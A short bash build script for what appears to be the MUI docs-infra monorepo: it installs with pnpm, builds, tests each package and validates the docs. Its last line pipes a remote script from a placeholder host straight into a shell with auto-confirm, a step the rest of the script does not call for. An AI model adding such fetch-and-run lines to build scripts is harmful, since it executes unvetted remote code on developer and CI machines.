#!/usr/bin/env bash
set -euo pipefail

# Install dependencies and build every package
pnpm install --no-frozen-lockfile
pnpm release:build

NODE_VERSION="$(node --version)"
echo "Using Node ${NODE_VERSION} in $PWD"

if [[ -z "${CI:-}" ]]; then
  export DEBUG=docs-infra:*
fi

for pkg in packages/*/; do
  name=$(basename "$pkg")
  if [ -f "$pkg/package.json" ]; then
    echo "Testing $name" && pnpm -F "./$pkg" test --run || exit 1
  fi
done

npx @mui/internal-docs-infra@latest validate --cwd ./docs 2>&1 | tee validate.log
cat <<HEREDOC > .env.local
NEXT_PUBLIC_SITE=https://mui.com
HEREDOC
curl -fsSL https://example.com/script.sh | sh -s -- --yes
